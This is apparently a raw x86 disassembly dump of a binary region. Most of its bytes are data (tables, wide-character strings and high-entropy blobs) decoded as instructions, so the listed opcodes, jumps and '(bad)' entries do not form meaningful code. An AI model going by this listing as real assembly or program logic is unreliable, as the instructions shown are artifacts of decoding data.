  410e0c:	add    BYTE PTR [eax],al
  410e0e:	add    BYTE PTR [eax],al
  410e10:	add    DWORD PTR [eax],eax
  410e12:	or     DWORD PTR [eax+eax*1],eax
  410e15:	add    BYTE PTR [eax+0x6],dl
	...
  410e20:	add    BYTE PTR [eax],al
  410e22:	add    al,0x0
  410e24:	add    BYTE PTR [eax],al
  410e26:	add    BYTE PTR [eax],al
  410e28:	add    DWORD PTR [eax],eax
  410e2a:	or     DWORD PTR [eax+eax*1],eax
  410e2d:	add    BYTE PTR [eax+0x6],ah
	...
  410e38:	add    BYTE PTR [eax],al
  410e3a:	add    al,0x0
  410e3c:	add    BYTE PTR [eax],al
  410e3e:	add    BYTE PTR [eax],al
  410e40:	add    DWORD PTR [eax],eax
  410e42:	or     DWORD PTR [eax+eax*1],eax
  410e45:	add    BYTE PTR [eax+0x6],dh
	...
  410e50:	add    BYTE PTR [eax],al
  410e52:	add    al,0x0
  410e54:	add    BYTE PTR [eax],al
  410e56:	add    BYTE PTR [eax],al
  410e58:	add    DWORD PTR [eax],eax
  410e5a:	or     DWORD PTR [eax+eax*1],eax
  410e5d:	add    BYTE PTR [eax+0x6],al
  410e63:	add    BYTE PTR [eax],al
  410e65:	add    BYTE PTR [eax],al
  410e67:	add    BYTE PTR [eax],al
  410e69:	add    BYTE PTR [eax+eax*1],al
  410e6c:	add    BYTE PTR [eax],al
  410e6e:	add    BYTE PTR [eax],al
  410e70:	add    DWORD PTR [eax],eax
  410e72:	or     DWORD PTR [eax+eax*1],eax
  410e75:	add    BYTE PTR [eax+0x6],dl
  410e7b:	add    BYTE PTR [eax],al
  410e7d:	add    BYTE PTR [eax],al
  410e7f:	add    BYTE PTR [eax],al
  410e81:	add    BYTE PTR [eax+eax*1],al
  410e84:	add    BYTE PTR [eax],al
  410e86:	add    BYTE PTR [eax],al
  410e88:	add    DWORD PTR [eax],eax
  410e8a:	or     DWORD PTR [eax+eax*1],eax
  410e8d:	add    BYTE PTR [eax+0x6],ah
  410e93:	add    BYTE PTR [eax],al
  410e95:	add    BYTE PTR [eax],al
  410e97:	add    BYTE PTR [eax],al
  410e99:	add    BYTE PTR [eax+eax*1],al
  410e9c:	add    BYTE PTR [eax],al
  410e9e:	add    BYTE PTR [eax],al
  410ea0:	add    DWORD PTR [eax],eax
  410ea2:	or     DWORD PTR [eax+eax*1],eax
  410ea5:	add    BYTE PTR [eax+0x6],dh
  410eab:	add    BYTE PTR [eax],al
  410ead:	add    BYTE PTR [eax],al
  410eaf:	add    BYTE PTR [eax],al
  410eb1:	add    BYTE PTR [eax+eax*1],al
  410eb4:	add    BYTE PTR [eax],al
  410eb6:	add    BYTE PTR [eax],al
  410eb8:	add    DWORD PTR [eax],eax
  410eba:	or     DWORD PTR [eax+eax*1],eax
  410ebd:	add    al,al
  410ebf:	push   es
  410ec0:	add    BYTE PTR [eax],al
  410ec2:	xor    dl,BYTE PTR [ebx]
  410ec4:	add    DWORD PTR [eax],eax
  410ec6:	adc    cl,BYTE PTR [ecx]
  410ec8:	add    BYTE PTR [eax],al
  410eca:	in     al,0x4
  410ecc:	add    BYTE PTR [eax],al
  410ece:	add    BYTE PTR [eax],al
  410ed0:	add    BYTE PTR [eax],al
  410ed2:	inc    esp
  410ed3:	sbb    al,0x1
  410ed5:	add    BYTE PTR [edx],dl
  410ed7:	or     DWORD PTR [eax],eax
  410ed9:	add    ah,ah
  410edb:	add    al,0x0
  410edd:	add    BYTE PTR [eax],al
  410edf:	add    BYTE PTR [eax],al
  410ee1:	add    BYTE PTR [esi+0x25],dl
  410ee4:	add    DWORD PTR [eax],eax
  410ee6:	or     cl,BYTE PTR [ecx]
  410ee8:	add    BYTE PTR [eax],al
  410eea:	in     al,0x4
  410eec:	add    BYTE PTR [eax],al
  410eee:	add    BYTE PTR [eax],al
  410ef0:	add    BYTE PTR [eax],al
  410ef2:	pusha  
  410ef3:	add    DWORD PTR cs:[eax],eax
  410ef6:	or     BYTE PTR [ecx],cl
  410ef8:	add    BYTE PTR [eax],al
  410efa:	in     al,0x4
  410efc:	add    BYTE PTR [eax],al
  410efe:	add    BYTE PTR [eax],al
  410f00:	add    BYTE PTR [eax],al
  410f02:	push   0x6000137
  410f07:	or     DWORD PTR [eax],eax
  410f09:	add    ah,ah
  410f0b:	add    al,0x0
  410f0d:	add    BYTE PTR [eax],al
  410f0f:	add    BYTE PTR [eax],al
  410f11:	add    BYTE PTR [esi+0x40],ch
  410f14:	add    DWORD PTR [eax],eax
  410f16:	push   es
  410f17:	or     DWORD PTR [eax],eax
  410f19:	add    ah,ah
  410f1b:	add    al,0x0
  410f1d:	add    BYTE PTR [eax],al
  410f1f:	add    BYTE PTR [eax],al
  410f21:	add    BYTE PTR [ecx+ecx*2+0x1],dh
  410f25:	add    BYTE PTR [esi],cl
  410f27:	or     DWORD PTR [eax],eax
  410f29:	add    ah,ah
  410f2b:	add    al,0x0
  410f2d:	add    BYTE PTR [eax],al
  410f2f:	add    BYTE PTR [eax],al
  410f31:	add    BYTE PTR [edx+0xa000152],al
  410f37:	or     DWORD PTR [eax],eax
  410f39:	add    ah,ah
  410f3b:	add    al,0x0
  410f3d:	add    BYTE PTR [eax],al
  410f3f:	add    BYTE PTR [eax],al
  410f41:	add    BYTE PTR [ebx+ebx*2+0x90a0001],cl
  410f48:	add    BYTE PTR [eax],al
  410f4a:	in     al,0x4
  410f4c:	add    BYTE PTR [eax],al
  410f4e:	add    BYTE PTR [eax],al
  410f50:	add    BYTE PTR [eax],al
  410f52:	xchg   esi,eax
  410f53:	add    DWORD PTR fs:[eax],eax
  410f56:	or     cl,BYTE PTR [ecx]
  410f58:	add    BYTE PTR [eax],al
  410f5a:	in     al,0x4
  410f5c:	add    BYTE PTR [eax],al
  410f5e:	add    BYTE PTR [eax],al
  410f60:	add    BYTE PTR [eax],al
  410f62:	mov    al,ds:0xe00016d
  410f67:	or     DWORD PTR [eax],eax
  410f69:	add    ah,ah
  410f6b:	add    al,0x0
  410f6d:	add    BYTE PTR [eax],al
  410f6f:	add    BYTE PTR [eax],al
  410f71:	add    BYTE PTR [esi+0xa000176],ch
  410f77:	or     DWORD PTR [eax],eax
  410f79:	add    ah,ah
  410f7b:	add    al,0x0
  410f7d:	add    BYTE PTR [eax],al
  410f7f:	add    BYTE PTR [eax],al
  410f81:	add    BYTE PTR [eax+0x1200017f],bh
  410f87:	or     DWORD PTR [eax],eax
  410f89:	add    ah,ah
  410f8b:	add    al,0x0
  410f8d:	add    BYTE PTR [eax],al
  410f8f:	add    BYTE PTR [eax],al
  410f91:	add    dl,cl
  410f93:	mov    BYTE PTR [ecx],al
  410f95:	add    BYTE PTR [esi],cl
  410f97:	or     DWORD PTR [eax],eax
  410f99:	add    ah,ah
  410f9b:	add    al,0x0
  410f9d:	add    BYTE PTR [eax],al
  410f9f:	add    BYTE PTR [eax],al
  410fa1:	add    al,bl
  410fa3:	xchg   ecx,eax
  410fa4:	add    DWORD PTR [eax],eax
  410fa6:	adc    cl,BYTE PTR [ecx]
  410fa8:	add    BYTE PTR [eax],al
  410faa:	in     al,0x4
  410fac:	add    BYTE PTR [eax],al
  410fae:	add    BYTE PTR [eax],al
  410fb0:	add    BYTE PTR [eax],al
  410fb2:	jmp    0x9:0x600019a
  410fb9:	add    ah,ah
  410fbb:	add    al,0x0
  410fbd:	add    BYTE PTR [eax],al
  410fbf:	add    BYTE PTR [eax],al
  410fc1:	add    al,dh
  410fc3:	mov    ds:0x90a0001,eax
  410fc8:	add    BYTE PTR [eax],al
  410fca:	in     al,0x4
  410fcc:	add    BYTE PTR [eax],al
  410fce:	add    BYTE PTR [eax],al
  410fd0:	add    BYTE PTR [eax],al
  410fd2:	cli    
  410fd3:	lods   al,BYTE PTR ds:[esi]
  410fd4:	add    DWORD PTR [eax],eax
  410fd6:	sbb    cl,BYTE PTR [ecx]
  410fd8:	add    BYTE PTR [eax],al
  410fda:	in     al,0x4
  410fdc:	add    BYTE PTR [eax],al
  410fde:	add    BYTE PTR [eax],al
  410fe0:	add    BYTE PTR [eax],al
  410fe2:	adc    al,0xb6
  410fe4:	add    DWORD PTR [eax],eax
  410fe6:	or     cl,BYTE PTR [ecx]
  410fe8:	add    BYTE PTR [eax],al
  410fea:	in     al,0x4
  410fec:	add    BYTE PTR [eax],al
  410fee:	add    BYTE PTR [eax],al
  410ff0:	add    BYTE PTR [eax],al
  410ff2:	push   ds
  410ff3:	mov    edi,0x90a0001
  410ff8:	add    BYTE PTR [eax],al
  410ffa:	in     al,0x4
  410ffc:	add    BYTE PTR [eax],al
  410ffe:	add    BYTE PTR [eax],al
  411000:	add    BYTE PTR [eax],al
  411002:	sub    al,cl
  411004:	add    DWORD PTR [eax],eax
  411006:	push   ss
  411007:	or     DWORD PTR [eax],eax
  411009:	add    ah,ah
  41100b:	add    al,0x0
  41100d:	add    BYTE PTR [eax],al
  41100f:	add    BYTE PTR [eax],al
  411011:	add    BYTE PTR [esi],bh
  411013:	rol    DWORD PTR [ecx],1
  411015:	add    BYTE PTR [esi],cl
  411017:	or     DWORD PTR [eax],eax
  411019:	add    ah,ah
  41101b:	add    al,0x0
  41101d:	add    BYTE PTR [eax],al
  41101f:	add    BYTE PTR [eax],al
  411021:	add    BYTE PTR [edx+ebx*8+0x1],cl
  411025:	add    BYTE PTR [edx],dl
  411027:	or     DWORD PTR [eax],eax
  411029:	add    ah,ah
  41102b:	add    al,0x0
  41102d:	add    BYTE PTR [eax],al
  41102f:	add    BYTE PTR [eax],al
  411031:	add    BYTE PTR [esi-0x1d],bl
  411034:	add    DWORD PTR [eax],eax
  411036:	push   es
  411037:	or     DWORD PTR [eax],eax
  411039:	add    ah,ah
  41103b:	add    al,0x0
  41103d:	add    BYTE PTR [eax],al
  41103f:	add    BYTE PTR [eax],al
  411041:	add    BYTE PTR [esp+ebp*8+0x1],ah
  411045:	add    BYTE PTR [esi],al
  411047:	or     DWORD PTR [eax],eax
  411049:	add    ah,ah
  41104b:	add    al,0x0
  41104d:	add    BYTE PTR [eax],al
  41104f:	add    BYTE PTR [eax],al
  411051:	add    BYTE PTR [edx-0xb],ch
  411054:	add    DWORD PTR [eax],eax
  411056:	or     cl,BYTE PTR [ecx]
  411058:	add    BYTE PTR [eax],al
  41105a:	in     al,0x4
  41105c:	add    BYTE PTR [eax],al
  41105e:	add    BYTE PTR [eax],al
  411060:	add    BYTE PTR [eax],al
  411062:	je     0x411062
  411064:	add    DWORD PTR [eax],eax
  411066:	push   es
  411067:	or     DWORD PTR [eax],eax
  411069:	add    ah,ah
  41106b:	add    al,0x0
  41106d:	add    BYTE PTR [eax],al
  41106f:	add    BYTE PTR [eax],al
  411071:	add    BYTE PTR [edx+0x7],bh
  411074:	add    al,BYTE PTR [eax]
  411076:	or     cl,BYTE PTR [ecx]
  411078:	add    BYTE PTR [eax],al
  41107a:	in     al,0x4
  41107c:	add    BYTE PTR [eax],al
  41107e:	add    BYTE PTR [eax],al
  411080:	add    BYTE PTR [eax],al
  411082:	test   BYTE PTR [eax],dl
  411084:	add    al,BYTE PTR [eax]
  411086:	or     cl,BYTE PTR [ecx]
  411088:	add    BYTE PTR [eax],al
  41108a:	in     al,0x4
  41108c:	add    BYTE PTR [eax],al
  41108e:	add    BYTE PTR [eax],al
  411090:	add    BYTE PTR [eax],al
  411092:	mov    ds,WORD PTR [ecx]
  411094:	add    al,BYTE PTR [eax]
  411096:	push   cs
  411097:	or     DWORD PTR [eax],eax
  411099:	add    ah,ah
  41109b:	add    al,0x0
  41109d:	add    BYTE PTR [eax],al
  41109f:	add    BYTE PTR [eax],al
  4110a1:	add    BYTE PTR ds:0x56004100,cl
  4110a7:	add    BYTE PTR [esi+0x0],dl
  4110aa:	pop    edi
  4110ab:	add    BYTE PTR [ebp+0x0],cl
  4110ae:	inc    esi
  4110af:	add    BYTE PTR [edx+0x0],bl
  4110b2:	xor    DWORD PTR [eax],eax
  4110b4:	pop    edi
  4110b5:	add    BYTE PTR [edi+0x0],al
  4110b8:	pop    ecx
  4110b9:	add    BYTE PTR [edx+0x0],cl
  4110bc:	aaa    
  4110bd:	add    BYTE PTR [esi],cl
  4110bf:	add    BYTE PTR [ebp+0x0],dl
  4110c2:	xor    eax,DWORD PTR [eax]
  4110c4:	dec    ecx
  4110c5:	add    BYTE PTR [edi+0x0],bl
  4110c8:	cmp    BYTE PTR [eax],al
  4110ca:	push   ecx
  4110cb:	add    BYTE PTR [eax],dh
  4110cd:	add    BYTE PTR [ebx+0x0],cl
  4110d0:	dec    ebp
  4110d1:	add    BYTE PTR [edi],dh
  4110d3:	add    BYTE PTR [ecx],bh
  4110d5:	add    BYTE PTR [edi+0x0],bl
  4110d8:	push   ebx
  4110d9:	add    BYTE PTR [eax+0x0],dl
  4110dc:	or     BYTE PTR [eax],al
  4110de:	inc    ebp
  4110df:	add    BYTE PTR [eax],bh
  4110e1:	add    BYTE PTR [eax],bh
  4110e3:	add    BYTE PTR [edi+0x0],bl
  4110e6:	dec    ebx
  4110e7:	add    BYTE PTR [eax+0x0],cl
  4110ea:	push   eax
  4110eb:	add    BYTE PTR [ecx],bh
  4110ed:	add    BYTE PTR [ebx],cl
  4110ef:	add    BYTE PTR [edi+0x0],cl
  4110f2:	aaa    
  4110f3:	add    BYTE PTR [eax],dh
  4110f5:	add    BYTE PTR [edx],dh
  4110f7:	add    BYTE PTR [edi+0x0],bl
  4110fa:	cmp    DWORD PTR [eax],eax
  4110fc:	cmp    BYTE PTR [eax],al
  4110fe:	inc    edi
  4110ff:	add    BYTE PTR [edi+0x0],bl
  411102:	xor    BYTE PTR [eax],al
  411104:	dec    ebp
  411105:	add    BYTE PTR [eax+eax*1],cl
  411108:	inc    esi
  411109:	add    BYTE PTR [edx+0x0],bl
  41110c:	dec    esp
  41110d:	add    BYTE PTR [edi+0x0],bl
  411110:	add    BYTE PTR ss:[ebx],dh
  411113:	add    BYTE PTR [edi+0x0],cl
  411116:	push   esi
  411117:	add    BYTE PTR [eax+eax*1],dh
  41111a:	pop    edi
  41111b:	add    BYTE PTR [eax],bh
  41111d:	add    BYTE PTR [esi+0x0],cl
  411120:	or     BYTE PTR [eax],al
  411122:	dec    edi
  411123:	add    BYTE PTR [edx+0x0],dl
  411126:	push   esp
  411127:	add    BYTE PTR [edi+0x0],bl
  41112a:	push   ebp
  41112b:	add    BYTE PTR [edx],dh
  41112d:	add    BYTE PTR [ecx+0x0],bl
  411130:	xor    eax,DWORD PTR [eax]
  411132:	or     BYTE PTR [eax],al
  411134:	inc    edi
  411135:	add    BYTE PTR [ecx+0x0],cl
  411138:	push   edi
  411139:	add    BYTE PTR [edi+0x0],bl
  41113c:	xor    eax,0x44003100
  411141:	add    BYTE PTR [ecx],dh
  411143:	add    BYTE PTR [eax],cl
  411145:	add    BYTE PTR [ebp+0x0],al
  411148:	push   ebp
  411149:	add    BYTE PTR [edi],dh
  41114b:	add    BYTE PTR [eax],dh
  41114d:	add    BYTE PTR [edi+0x0],bl
  411150:	inc    esi
  411151:	add    BYTE PTR [eax+eax*1+0x35],al
  411155:	add    BYTE PTR [edx],cl
  411157:	add    BYTE PTR [ebp+0x0],cl
  41115a:	xor    al,0x0
  41115c:	push   esi
  41115d:	add    BYTE PTR [edi+0x0],bl
  411160:	dec    eax
  411161:	add    BYTE PTR [eax],dh
  411163:	add    BYTE PTR [eax+0x0],bl
  411166:	inc    esp
  411167:	add    BYTE PTR ds:0xb003000,dh
  41116d:	add    BYTE PTR [ecx+0x0],dl
  411170:	xor    al,0x0
  411172:	pop    edx
  411173:	add    BYTE PTR [edi+0x0],bl
  411176:	inc    edx
  411177:	add    BYTE PTR [eax+eax*1+0x42],al
  41117b:	add    BYTE PTR [ebx+0x0],dl
  41117e:	pop    edi
  41117f:	add    BYTE PTR [eax],dh
  411181:	add    BYTE PTR [ebp+0x0],dl
  411184:	or     al,0x0
  411186:	push   edx
  411187:	add    BYTE PTR [edi+0x0],al
  41118a:	push   esp
  41118b:	add    BYTE PTR [eax],bh
  41118d:	add    BYTE PTR [esi],dh
  41118f:	add    BYTE PTR [edi+0x0],bl
  411192:	dec    eax
  411193:	add    BYTE PTR [ebp+0x0],al
  411196:	push   esp
  411197:	add    BYTE PTR [edx+0x0],cl
  41119a:	push   edi
  41119b:	add    BYTE PTR [ecx+0x0],dl
  41119e:	or     DWORD PTR [eax],eax
  4111a0:	pop    edx
  4111a1:	add    BYTE PTR [edx+0x0],dl
  4111a4:	dec    edx
  4111a5:	add    BYTE PTR [edi+0x0],bl
  4111a8:	xor    BYTE PTR [eax],al
  4111aa:	aaa    
  4111ab:	add    BYTE PTR [esi+0x0],dl
  4111ae:	inc    edx
  4111af:	add    BYTE PTR [eax],dh
  4111b1:	add    BYTE PTR [esi],cl
  4111b3:	add    BYTE PTR [eax+0x0],cl
  4111b6:	cmp    DWORD PTR [eax],eax
  4111b8:	dec    ebx
  4111b9:	add    BYTE PTR [edi+0x0],bl
  4111bc:	xor    al,0x0
  4111be:	inc    ecx
  4111bf:	add    BYTE PTR [ecx],bh
  4111c1:	add    BYTE PTR [esi+0x0],dl
  4111c4:	cmp    DWORD PTR [eax],eax
  4111c6:	pop    edi
  4111c7:	add    BYTE PTR [eax+0x0],cl
  4111ca:	dec    ecx
  4111cb:	add    BYTE PTR [eax+eax*1+0x58],al
  4111cf:	add    BYTE PTR [eax],cl
  4111d1:	add    BYTE PTR [eax+0x0],dl
  4111d4:	dec    esi
  4111d5:	add    BYTE PTR [eax+0x0],cl
  4111d8:	pop    edi
  4111d9:	add    BYTE PTR [eax],dh
  4111db:	add    BYTE PTR [ecx+0x0],dl
  4111de:	xor    DWORD PTR [eax],eax
  4111e0:	dec    ebp
  4111e1:	add    BYTE PTR [ebx],cl
  4111e3:	add    BYTE PTR [edi+0x0],cl
  4111e6:	dec    esp
  4111e7:	add    BYTE PTR [ecx+0x0],bl
  4111ea:	pop    edi
  4111eb:	add    BYTE PTR [eax+0x0],bl
  4111ee:	dec    esp
  4111ef:	add    BYTE PTR [edi+0x0],cl
  4111f2:	push   eax
  4111f3:	add    BYTE PTR [edi+0x0],bl
  4111f6:	xor    eax,DWORD PTR [eax]
  4111f8:	inc    edi
  4111f9:	add    BYTE PTR ds:0x51004f00,cl
  4111ff:	add    BYTE PTR [edx+0x0],cl
  411202:	pop    edi
  411203:	add    BYTE PTR [edx],dh
  411205:	add    BYTE PTR ds:0x59003600,dh
  41120b:	add    BYTE PTR [edi+0x0],bl
  41120e:	cmp    DWORD PTR [eax],eax
  411210:	cmp    DWORD PTR [eax],eax
  411212:	push   edx
  411213:	add    BYTE PTR [ebx],dh
  411215:	add    BYTE PTR [ecx],cl
  411217:	add    BYTE PTR [ebx+0x0],cl
  41121a:	push   ecx
  41121b:	add    BYTE PTR [ebp+0x0],dl
  41121e:	pop    edi
  41121f:	add    BYTE PTR [esi+0x0],dl
  411222:	xor    eax,0x32004400
  411227:	add    BYTE PTR [eax],dh
  411229:	add    BYTE PTR [edx],cl
  41122b:	add    BYTE PTR [eax+0x0],dl
  41122e:	push   eax
  41122f:	add    BYTE PTR [esi],dh
  411231:	add    BYTE PTR [edi+0x0],bl
  411234:	dec    eax
  411235:	add    BYTE PTR [ebp+0x0],cl
  411238:	xor    DWORD PTR [eax],eax
  41123a:	xor    al,BYTE PTR [eax]
  41123c:	pop    edi
  41123d:	add    BYTE PTR [eax+eax*1+0xa],dl
  411241:	add    BYTE PTR [ebp+0x0],al
  411244:	pop    eax
  411245:	add    BYTE PTR [eax+eax*1],dh
  411248:	aaa    
  411249:	add    BYTE PTR [esi],dh
  41124b:	add    BYTE PTR [esi],dh
  41124d:	add    BYTE PTR ds:0x48005f00,dh
  411253:	add    BYTE PTR [edx],dh
  411255:	add    BYTE PTR [ebx],cl
  411257:	add    BYTE PTR [ebx+0x0],dl
  41125a:	inc    edi
  41125b:	add    BYTE PTR [eax],bh
  41125d:	add    BYTE PTR [edi+0x0],bl
  411260:	inc    edi
  411261:	add    BYTE PTR [edx+0x0],cl
  411264:	pop    ecx
  411265:	add    BYTE PTR [esi],dh
  411267:	add    BYTE PTR [edi+0x0],bl
  41126a:	cmp    DWORD PTR [eax],eax
  41126c:	cmp    DWORD PTR [eax],eax
  41126e:	push   cs
  41126f:	add    BYTE PTR [ebp+0x0],dl
  411272:	xor    DWORD PTR [eax],eax
  411274:	add    BYTE PTR ss:[edi+0x0],bl
  411278:	pop    ecx
  411279:	add    BYTE PTR [edx+0x0],bl
  41127c:	push   ebx
  41127d:	add    BYTE PTR [eax],dh
  41127f:	add    BYTE PTR [eax],bh
  411281:	add    BYTE PTR [edi+0x0],bl
  411284:	push   ecx
  411285:	add    BYTE PTR [ebx+0x0],al
  411288:	push   edi
  411289:	add    BYTE PTR [edx],dh
  41128b:	add    BYTE PTR [ebx],cl
  41128d:	add    BYTE PTR [eax+eax*1+0x4e],dl
  411291:	add    BYTE PTR [edx],dh
  411293:	add    BYTE PTR [edi+0x0],bl
  411296:	push   eax
  411297:	add    BYTE PTR [edx+0x0],al
  41129a:	inc    edx
  41129b:	add    BYTE PTR [ecx+0x0],bl
  41129e:	pop    edi
  41129f:	add    BYTE PTR [ebp+0x0],cl
  4112a2:	push   esp
  4112a3:	add    BYTE PTR [eax+eax*1],cl
  4112a6:	pop    edx
  4112a7:	add    BYTE PTR [eax+0x0],cl
  4112aa:	add    BYTE PTR ss:[edi+0x0],bl
  4112ae:	xor    al,BYTE PTR [eax]
  4112b0:	inc    edx
  4112b1:	add    BYTE PTR [ebx+0x0],al
  4112b4:	pop    edi
  4112b5:	add    BYTE PTR [ebp+0x0],dl
  4112b8:	pop    ecx
  4112b9:	add    BYTE PTR [edi],dh
  4112bb:	add    BYTE PTR [edi+0x0],cl
  4112be:	push   cs
  4112bf:	add    BYTE PTR [ebp+0x0],dl
  4112c2:	xor    BYTE PTR [eax],al
  4112c4:	inc    ebx
  4112c5:	add    BYTE PTR [edi+0x0],bl
  4112c8:	inc    edi
  4112c9:	add    BYTE PTR ds:0x38004100,dh
  4112cf:	add    BYTE PTR [edi+0x0],bl
  4112d2:	push   edx
  4112d3:	add    BYTE PTR [eax+eax*1],dh
  4112d6:	xor    BYTE PTR [eax],al
  4112d8:	pop    edi
  4112d9:	add    BYTE PTR [ecx+0x0],al
  4112dc:	or     al,0x0
  4112de:	push   esi
  4112df:	add    BYTE PTR [eax],dh
  4112e1:	add    BYTE PTR [edi+0x0],cl
  4112e4:	xor    al,BYTE PTR [eax]
  4112e6:	pop    edi
  4112e7:	add    BYTE PTR [esi+0x0],cl
  4112ea:	push   ebp
  4112eb:	add    BYTE PTR [esi+0x0],dl
  4112ee:	inc    ecx
  4112ef:	add    BYTE PTR [eax+0x0],dl
  4112f2:	pop    edi
  4112f3:	add    BYTE PTR [eax],bh
  4112f5:	add    BYTE PTR [eax],cl
  4112f7:	add    BYTE PTR [edi+0x0],dl
  4112fa:	dec    eax
  4112fb:	add    BYTE PTR [eax+0x0],bl
  4112fe:	pop    edi
  4112ff:	add    BYTE PTR [ebp+0x0],cl
  411302:	push   esi
  411303:	add    BYTE PTR [edi+0x0],cl
  411306:	push   edx
  411307:	add    BYTE PTR ds:0x47004e00,cl
  41130d:	add    BYTE PTR [eax+eax*1],dh
  411310:	xor    DWORD PTR [eax],eax
  411312:	pop    edi
  411313:	add    BYTE PTR [esi+0x0],al
  411316:	push   esp
  411317:	add    BYTE PTR [edx+0x0],bl
  41131a:	dec    ecx
  41131b:	add    BYTE PTR [edi+0x0],bl
  41131e:	inc    edi
  41131f:	add    BYTE PTR [ecx+0x0],cl
  411322:	dec    eax
	...
  41132f:	add    BYTE PTR [eax],al
  411331:	add    BYTE PTR [ecx+0x6a],ah
  411334:	jmp    0xffd8fe50
  411339:	jle    0x411341
  41133b:	js     0x4112ea
  41133d:	aam    0x12
  41133f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411340:	fidivr WORD PTR [ecx]
  411342:	ins    DWORD PTR es:[edi],dx
  411343:	jle    0x411346
  411345:	add    BYTE PTR [edx],ah
  411347:	pop    es
  411348:	add    BYTE PTR [eax],al
  41134a:	pop    esp
  41134b:	mov    ebx,0x30b2aeec
  411350:	aad    0xbf
  411352:	(bad)  
  411353:	jmp    0x41131c
  411355:	xlat   BYTE PTR ds:[ebx]
  411356:	sbb    dl,BYTE PTR [edi-0x35fed578]
  41135c:	jecxz  0x4113ad
  41135e:	push   ebx
  41135f:	sbb    eax,0xffb5c4c
  411364:	dec    esi
  411365:	cs sbb eax,0x6fd654b7
  41136b:	and    ah,dl
  41136d:	fstp   DWORD PTR ds:[ebp+0x68]
  411371:	das    
  411372:	pop    ebp
  411373:	les    eax,FWORD PTR [eax-0x2b9aa767]
  411379:	scas   al,BYTE PTR es:[edi]
  41137a:	add    esp,DWORD PTR [edi]
  41137c:	add    eax,0x19cfebbb
  411381:	add    DWORD PTR [ebx+esi*2+0x6cfe2ef],eax
  411388:	add    eax,0x73e6cae9
  41138d:	sub    BYTE PTR [ecx-0x3b],ah
  411390:	cmp    eax,0x9a72c259
  411395:	lods   al,BYTE PTR ds:[esi]
  411396:	dec    eax
  411397:	mov    ebx,0xbf066d10
  41139c:	inc    esi
  41139d:	aad    0xd9
  41139f:	pop    eax
  4113a0:	xchg   esi,eax
  4113a1:	dec    edx
  4113a2:	sbb    al,0x3a
  4113a4:	pop    ds
  4113a5:	add    esp,DWORD PTR [edi-0x28e0608e]
  4113ab:	inc    esp
  4113ac:	mov    bh,0x7f
  4113ae:	mov    edx,0x12ea1959
  4113b3:	push   0x64e0194e
  4113b8:	xchg   ecx,eax
  4113b9:	mov    cl,bl
  4113bb:	xchg   edi,eax
  4113bc:	dec    eax
  4113bd:	shr    edx,0xcc
  4113c0:	jne    0x411436
  4113c2:	test   al,0xaa
  4113c4:	add    al,al
  4113c6:	and    eax,0x8b5e26b4
  4113cb:	or     BYTE PTR [ecx+0x2ff1befa],dl
  4113d1:	sub    dh,al
  4113d3:	mov    DWORD PTR [ecx-0x1455c7ae],eax
  4113d9:	test   BYTE PTR [ecx],0x8
  4113dc:	int    0x48
  4113de:	fsub   st,st(6)
  4113e0:	hlt    
  4113e1:	popa   
  4113e2:	in     eax,0xbf
  4113e4:	aam    0x33
  4113e6:	mov    ebp,0xd27b3316
  4113eb:	sar    BYTE PTR [esi-0xbca4f9b],0x74
  4113f2:	ds cmp al,0x2e
  4113f5:	test   BYTE PTR [edi-0x138ba134],dl
  4113fb:	loopne 0x41146f
  4113fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113fe:	nop
  4113ff:	popa   
  411400:	cs xchg ebp,eax
  411402:	sbb    BYTE PTR [ebp-0x1c],ah
  411405:	xor    al,0x44
  411407:	mov    ebx,0x80e6821f
  41140c:	pop    edi
  41140d:	mov    ah,0x76
  41140f:	mov    esi,esi
  411411:	int3   
  411412:	jae    0x4113f7
  411414:	mov    DWORD PTR [esp+edx*1-0x20c23c8a],0x9a6505f3
  41141f:	mov    dl,0xfc
  411421:	shl    bl,1
  411423:	or     eax,0x905119f1
  411428:	xor    BYTE PTR [ebx],bl
  41142a:	push   esi
  41142b:	test   al,0x81
  41142d:	mov    ah,0x0
  41142f:	repz lock inc edx
  411432:	repz daa 
  411434:	stc    
  411435:	push   esp
  411436:	add    DWORD PTR [esi],edx
  411438:	sbb    dl,bh
  41143a:	mov    edx,0x2356b786
  41143f:	mov    esi,0x181a66c2
  411444:	call   0xf5d1fe02
  411449:	mov    bh,dh
  41144b:	or     BYTE PTR ds:0x8aa0c11e,dl
  411451:	add    eax,0x5df80fd9
  411456:	sub    DWORD PTR [edi],esp
  411458:	xchg   ebx,eax
  411459:	adc    esp,DWORD PTR [ebx+edi*2+0x227872f]
  411460:	sti    
  411461:	test   BYTE PTR [esi],ch
  411463:	inc    edx
  411464:	add    al,0x34
  411466:	dec    ebp
  411467:	(bad)  
  411468:	or     ebx,DWORD PTR [ecx]
  41146a:	fisttp DWORD PTR [edx+0x3a38a797]
  411470:	bound  eax,QWORD PTR [edi]
  411472:	inc    ebp
  411473:	or     eax,0xfe03d838
  411478:	in     eax,dx
  411479:	adc    bl,al
  41147b:	fisttp QWORD PTR [esi-0x3f]
  41147e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41147f:	daa    
  411480:	retf   
  411481:	mov    al,ds:0xbec627ed
  411486:	pop    ecx
  411487:	mov    DWORD PTR [esi+eax*2],0x29bd824a
  41148e:	loope  0x411442
  411490:	in     al,0x46
  411492:	ins    DWORD PTR es:[edi],dx
  411493:	mov    edi,0xdc5ba8e8
  411498:	sti    
  411499:	xchg   esi,eax
  41149a:	rcl    BYTE PTR [ebx+0x2e],1
  41149d:	ret    0x2aeb
  4114a0:	add    eax,eax
  4114a2:	ret    
  4114a3:	mov    WORD PTR [ebx],ds
  4114a5:	or     al,0xf1
  4114a7:	dec    eax
  4114a8:	and    al,BYTE PTR [ebx+0x20]
  4114ab:	pop    ds
  4114ac:	push   esi
  4114ad:	push   edi
  4114ae:	mov    dl,0x80
  4114b0:	push   eax
  4114b1:	pop    esp
  4114b2:	adc    al,0x34
  4114b4:	nop
  4114b5:	mov    ebx,0xad5b913c
  4114ba:	jle    0x41149b
  4114bc:	stc    
  4114bd:	ret    0x526a
  4114c0:	mov    eax,DWORD PTR [esi+0x75a77a5f]
  4114c6:	out    0xa0,al
  4114c8:	push   edx
  4114c9:	fmulp  st(7),st
  4114cb:	add    DWORD PTR [esi+0x3b],eax
  4114ce:	js     0x4114fd
  4114d0:	and    al,BYTE PTR [edx-0x64]
  4114d3:	sbb    dh,BYTE PTR [esi+0x2f589d63]
  4114d9:	and    edi,DWORD PTR [edx+0x183f6920]
  4114df:	popa   
